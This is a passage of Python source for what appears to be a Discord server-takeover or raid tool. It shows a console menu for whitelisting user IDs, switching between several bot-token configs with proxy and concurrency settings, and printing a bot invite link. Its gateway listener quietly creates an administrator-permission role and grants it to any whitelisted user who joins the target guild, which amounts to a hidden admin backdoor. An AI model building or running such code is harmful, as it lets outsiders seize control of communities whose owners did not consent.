                user_ids = [uid.strip()
                                    for uid in user_ids_input.split(',') if uid.strip()]
                if user_ids:
                    print(
                        format_log_message(
            "SUCCESS",
            f"Adding {len(user_ids)} user(s) to whitelist...",
            45))
                    for user_id in user_ids:
                        result = await self.add_to_whitelist(user_id)
                        if result:
                            print(
                                format_log_message(
            "SUCCESS",
            f"Added user #{user_id} to whitelist",
            48))
                else:
                    print(
                        format_log_message(
            "ERROR",
            "No valid user IDs provided",
            50))
                continue
    
            elif ans == "35":
                user_ids_input = await self.async_input(format_log_message("INFO", "User IDs to unwhitelist (comma-separated)", 50))
                user_ids = [uid.strip()
                                    for uid in user_ids_input.split(',') if uid.strip()]
                if user_ids:
                    print(
                        format_log_message(
            "SUCCESS",
            f"Removing {len(user_ids)} user(s) from whitelist...",
            45))
                    for user_id in user_ids:
                        result = await self.remove_from_whitelist(user_id)
                        if result:
                            print(
                                format_log_message(
            "SUCCESS",
            f"Removed user #{user_id} from whitelist",
            48))
                else:
                    print(
                        format_log_message(
            "ERROR",
            "No valid user IDs provided",
            50))
                continue
    
            elif ans == "36":
    
                print(
                    format_log_message(
            "INFO",
            f"Whitelisted Members ({len(self.whitelist)}):",
            50))
                if not self.whitelist:
                    print(gradient_text("  None", PINK_START, PINK_END, bold=True))
                    continue
    
                whitelisted_users = []
    
                async def fetch_user_info(user_id):
                    try:
    
                        async with httpx.AsyncClient() as c:
                            u_resp = await c.get(f"https://discord.com/api/v10/users/{user_id}", headers={"Authorization": f"Bot {__config__['token']}"})
                            if u_resp.status_code == 200:
                                u = u_resp.json()
                                return f"{u.get('username')}#{u.get('discriminator', '0'):<4} (ID: {u.get('id')})"
                            elif u_resp.status_code == 404:
                                return f"User Not Found (ID: {user_id})"
                            else:
                                return f"Error Fetching User (ID: {user_id})"
                    except Exception:
                        return f"Error Fetching User (ID: {user_id})"
    
                tasks = [fetch_user_info(user_id)
                                        for user_id in sorted(list(self.whitelist))]
                user_info_list = await asyncio.gather(*tasks)
    
                max_len = max(len(info) for info in user_info_list)
                header_len = max(max_len + 4, 70)
                print(
        gradient_text(
            "╭" +
            "─" *
            header_len +
            "╮",
            PINK_START,
            PINK_END,
            bold=True))
                for info in user_info_list:
    
                    print(
        gradient_text(
            f"│ {info:<{header_len - 4}}   │",
            PINK_START,
            PINK_END,
            bold=True))
                print(
        gradient_text(
            "╰" +
            "─" *
            header_len +
            "╯",
            PINK_START,
            PINK_END,
            bold=True))
                await asyncio.sleep(pause_seconds)
                continue
    
            elif ans == "37":
    
                if len(__loaded_configs__) < 2:
                    print(
                        format_log_message(
            "ERROR",
            "Only one config loaded. Load multiple configs at startup.",
            32))
                    continue
    
                print(
                    format_log_message(
            "INFO",
            "Available Configs to Switch:",
            50))
                print(
        gradient_text(
            "╭" + "─" * 70 + "╮",
            PINK_START,
            PINK_END,
            bold=True))
                config_names = list(__loaded_configs__.keys())
                for i, config_name in enumerate(config_names, 1):
                    marker = "? ACTIVE" if config_name == __current_config_name__ else "         "
                    bot_info = __loaded_configs__[config_name].get(
                        "token", "N/A")[:15] + "..."
                    print(
        gradient_text(
            f"│ {i:<2}│ {config_name:<30} {marker} │ {bot_info:<20}   │",
            PINK_START,
            PINK_END,
            bold=True))
                print(
        gradient_text(
            "╰" + "─" * 70 + "╯",
            PINK_START,
            PINK_END,
            bold=True))
    
                try:
                    choice = int((await self.async_input(format_log_message("INFO", "Choose config number", 50))).strip()) - 1
                    if 0 <= choice < len(config_names):
                        selected_config = config_names[choice]
                        if switch_config(selected_config):
                            print(
                                format_log_message(
            "SUCCESS",
            f"Switched to {gradient_text(selected_config, GREEN_START, GREEN_END, bold=True)}",
            45))
    
                            print(
                                format_log_message(
            "INFO",
            "Note: Restart required for new bot token to take effect",
            30))
                        else:
                            print(
                                format_log_message(
            "ERROR",
            "Failed to switch config",
            48))
                    else:
                        print(format_log_message("ERROR", "Invalid choice!", 49))
                except ValueError:
                    print(
                        format_log_message(
            "ERROR",
            "Invalid input! Please enter a number.",
            33))
                continue
    
            elif ans == "38":
    
                print(
                    format_log_message(
            "INFO",
            f"Loaded Configs ({len(__loaded_configs__)}):",
            50))
                print(
        gradient_text(
            "╭" + "─" * 120 + "╮",
            PINK_START,
            PINK_END,
            bold=True))
                for config_name, config_data in __loaded_configs__.items():
                    marker = "? ACTIVE" if config_name == __current_config_name__ else "  inactive"
                    bot_token_preview = config_data.get(
                        "token", "N/A")[:20] + "..."
                    max_conc = config_data.get("max_concurrent", "N/A")
                    use_proxy = "Yes" if config_data.get("proxy", False) else "No"
                    print(
        gradient_text(
            f"│ {marker}        │ {config_name:<25}      │ Token: {bot_token_preview:<27}    │ Proxy: {use_proxy:<3} │ MaxConc: {max_conc:<5} │",
            PINK_START,
            PINK_END,
            bold=True))
                print(
        gradient_text(
            "╰" + "─" * 120 + "╯",
            PINK_START,
            PINK_END,
            bold=True))
                input("\nPress Enter to return to the menu...")
                continue
    
            elif ans == "39":
                if hasattr(self, 'last_ui'):
                    await self._menu_exit_animation(*self.last_ui)
                print(format_log_message("SUCCESS", "Exiting...", 50))
                os._exit(0)
            elif ans == "40":
                await self.execute_guild_info(token)
            elif ans == "41":
                invite_link = __config__.get("operations", {}).get("ouath2")
                if not invite_link:
                    print(
                        format_log_message(
            "ERROR",
            "'ouath2' not found in config's 'operations' section!",
            40))
                else:
                    platform = await self.async_input(format_log_message("INFO", "Platform: [w]indows (copy) / [m]obile (print)", 50))
                    platform = platform.strip().lower()
    
                    if platform.startswith('w'):
                        try:
                            _clipboard_copy(invite_link)
                            print(
                                format_log_message(
            "SUCCESS",
            "Bot invite link copied to clipboard.",
            50))
                            print(
        gradient_text(
            invite_link,
            GREEN_START,
            GREEN_END,
            bold=True))
                        except Exception as e:
                            print(
                                format_log_message(
            "ERROR",
            f"Could not copy to clipboard: {e}",
            40))
                            print(
                                format_log_message(
            "INFO",
            f"Here is the link instead: {invite_link}",
            50))
                    elif platform.startswith('m'):
                        print(
                            format_log_message(
            "SUCCESS",
            "Bot invite link:",
            50))
                        print(
        gradient_text(
            invite_link,
            GREEN_START,
            GREEN_END,
            bold=True))
                    else:
                        print(
                            format_log_message(
            "INFO",
            "Invalid choice. Printing link.",
            40))
                        print(
        gradient_text(
            invite_link,
            GREEN_START,
            GREEN_END,
            bold=True))
                continue
            else:
                print(format_log_message("ERROR", f"Invalid option: {ans}!", 47))
                time.sleep(0.8)
                continue

async def gateway_listener():
    global bot_instance
    token = __config__["token"]
    gateway_url = "wss://gateway.discord.gg/?v=10&encoding=json"
    _sequence = None
    _session_id = None
    _resume_url = None
    _heartbeat_ack = True
    _reconnect_delay = 1

    while True:
        ws = None
        heartbeat_task = None
        try:
            connect_url = _resume_url if _resume_url else gateway_url
            ws = await websockets.connect(
                connect_url,
                max_size=2**20,
                ping_interval=None,
                close_timeout=4
            )

            hello = json.loads(await ws.recv())
            if hello.get("op") != 10:
                raise Exception("Expected HELLO (op 10)")
            heartbeat_interval = hello["d"]["heartbeat_interval"] / 1000
            _heartbeat_ack = True

            if _session_id and _sequence is not None:
                resume_payload = {
                    "op": 6,
                    "d": {
                        "token": token,
                        "session_id": _session_id,
                        "seq": _sequence
                    }
                }
                await ws.send(json.dumps(resume_payload))
            else:
                identify_payload = {
                    "op": 2,
                    "d": {
                        "token": token,
                        "intents": 32767,
                        "properties": {
                            "os": "windows",
                            "browser": "disco",
                            "device": "disco"
                        },
                        "large_threshold": 250
                    }
                }
                await ws.send(json.dumps(identify_payload))

            async def heartbeat_loop():
                nonlocal _heartbeat_ack
                await asyncio.sleep(heartbeat_interval * random.random())
                while True:
                    if not _heartbeat_ack:
                        await ws.close(4000)
                        return
                    _heartbeat_ack = False
                    try:
                        await ws.send(json.dumps({"op": 1, "d": _sequence}))
                    except Exception:
                        return
                    await asyncio.sleep(heartbeat_interval)

            heartbeat_task = asyncio.create_task(heartbeat_loop())
            _reconnect_delay = 1

            while True:
                msg = await ws.recv()
                data = json.loads(msg)
                op = data.get("op")
                t = data.get("t")
                s = data.get("s")

                if s is not None:
                    _sequence = s

                if op == 11:
                    _heartbeat_ack = True

                elif op == 1:
                    await ws.send(json.dumps({"op": 1, "d": _sequence}))

                elif op == 7:
                    await ws.close(4000)
                    break

                elif op == 9:
                    d = data.get("d")
                    if not d:
                        _session_id = None
                        _sequence = None
                        _resume_url = None
                    await asyncio.sleep(random.uniform(1, 5))
                    await ws.close(4000)
                    break

                elif op == 0:
                    if t == "READY":
                        d = data.get("d", {})
                        _session_id = d.get("session_id")
                        _resume_url = d.get("resume_gateway_url")
                        if _resume_url:
                            _resume_url += "?v=10&encoding=json"

                    elif t == "RESUMED":
                        pass

                    elif t == "GUILD_MEMBER_ADD":
                        member_data = data["d"]
                        if bot_instance and bot_instance.auto_admin_enabled:
                            member_id = member_data["user"]["id"]
                            member_guild_id = member_data["guild_id"]
                            if str(member_id) in bot_instance.whitelist and str(member_guild_id) == bot_instance.guildid:
                                try:
                                    session = await bot_instance._get_session()
                                    role_payload = {
                                        "name": "Admin",
                                        "permissions": "8",
                                        "color": 0xFF0000
                                    }
                                    resp = await session.post(
                                        f"https://discord.com/api/v10/guilds/{member_guild_id}/roles",
                                        headers={"Authorization": f"Bot {token}"},
                                        json=role_payload
                                    )
                                    if resp.status_code == 200:
                                        role_id = resp.json()["id"]
                                        await session.put(
                                            f"https://discord.com/api/v10/guilds/{member_guild_id}/members/{member_id}/roles/{role_id}",
                                            headers={"Authorization": f"Bot {token}"}
                                        )
                                        print(format_log_message("SUCCESS", f"Auto-granted admin to {member_data['user']['username']}", 25))
                                except Exception as e:
                                    print(format_log_message("ERROR", f"Failed to grant admin: {e}", 30))

        except websockets.exceptions.ConnectionClosedError as e:
            if e.code == 4004:
                print(format_log_message("ERROR", "Invalid token | gateway auth failed!", 40))
                return
            if e.code in (4010, 4011, 4012, 4013, 4014):
                _session_id = None
                _sequence = None
                _resume_url = None

        except Exception:
            pass

        finally:
            if heartbeat_task and not heartbeat_task.done():
                heartbeat_task.cancel()
            if ws:
                try:
                    await ws.close()
                except Exception:
                    pass

        await asyncio.sleep(min(_reconnect_delay, 30))
        _reconnect_delay = min(_reconnect_delay * 2, 30)

async def on_ready_mock():
    global bot_instance, __bot_user_id__, __bot_user_name__, __bot_user_discriminator__, __bot_guilds__
    try:
        os.system("cls") if os.name == "nt" else os.system("clear")
        
        token = __config__["token"]
        async with httpx.AsyncClient() as client:
            user_resp = await client.get("https://discord.com/api/v10/users/@me", headers={"Authorization": f"Bot {token}"})
            if user_resp.status_code == 200:
                user_data = user_resp.json()
                __bot_user_id__ = user_data["id"]
                __bot_user_name__ = user_data["username"]
                __bot_user_discriminator__ = user_data["discriminator"]
            else:
                print(format_log_message("ERROR", "Invalid Bot Token!", 24))
                os._exit(1)
                
            guilds_resp = await client.get("https://discord.com/api/v10/users/@me/guilds", headers={"Authorization": f"Bot {token}"})
            if guilds_resp.status_code == 200:
                __bot_guilds__ = guilds_resp.json()
        
        _animate_typewriter_log("SUCCESS", f"Authenticated as: {gradient_text(__bot_user_name__, (255, 255, 255), (0, 255, 0), bold=True)}#{__bot_user_discriminator__}", 24)

        asyncio.create_task(gateway_listener())

        guildid = ""
        fetch_guilds_choice = await asyncio.get_event_loop().run_in_executor(None, lambda: input(format_log_message("INFO", "Fetch and list available guilds? [y/n]", 50)))
        fetch_guilds_choice = fetch_guilds_choice.strip().lower()

        if fetch_guilds_choice == 'y' and __bot_guilds__:
            _animate_guild_list(__bot_guilds__, PINK_START, PINK_END)


            try:
                choice = await asyncio.get_event_loop().run_in_executor(None, lambda: input(format_log_message("INFO", "Choose guild number (or Enter for manual ID)", 50)))
                choice = choice.strip()
                if choice:
                    idx = int(choice) - 1
                    if 0 <= idx < len(__bot_guilds__):
                        guildid = str(__bot_guilds__[idx]['id'])
                        print(format_log_message("SUCCESS", f"Selected: {(__bot_guilds__[idx]['name'])}", 43))
                    else:
                        raise ValueError
                else:
                    guildid = await asyncio.get_event_loop().run_in_executor(None, lambda: input(format_log_message("INFO", "Enter Guild ID manually", 50)))
                    guildid = guildid.strip()
            except (ValueError, IndexError):
                print(format_log_message("ERROR", "Invalid choice. Falling back to manual ID input.", 28))
                guildid = await asyncio.get_event_loop().run_in_executor(None, lambda: input(format_log_message("INFO", "Enter Guild ID", 50)))
                guildid = guildid.strip()
        else:
            if fetch_guilds_choice == 'y':
                print(format_log_message("ERROR", "No guilds found! Proceeding to manual ID input.", 28))
            else:
                print(format_log_message("INFO", "Skipping guild list.", 40))
            guildid = await asyncio.get_event_loop().run_in_executor(None, lambda: input(format_log_message("INFO", "Enter Guild ID", 50)))
            guildid = guildid.strip()

        if not guildid:
            print(format_log_message("ERROR", "No guild ID provided! Exiting.", 32))
            os._exit(1)

        bot_instance = shakti(guildid)
        print(format_log_message("INFO", "Use option 26 to grant admin to specific user IDs.", 40))
        await bot_instance.menu()
    except KeyboardInterrupt:
        os.system("cls") if os.name == "nt" else os.system("clear")
        print("\n" + format_log_message("INFO", "Exiting... Goodbye!", 40))
        os._exit(0)

if __name__ == "__main__":
    try:
        if os.name == "nt":
            os.system(f"title Codez On Top")
        asyncio.run(on_ready_mock())
    except KeyboardInterrupt:
        print("\n" + format_log_message("INFO", "Exiting... Goodbye!", 40))
        os._exit(0)
    except Exception as e:
        print(format_log_message("ERROR", f"Failed to start | {e}", 47))
        os._exit(1)
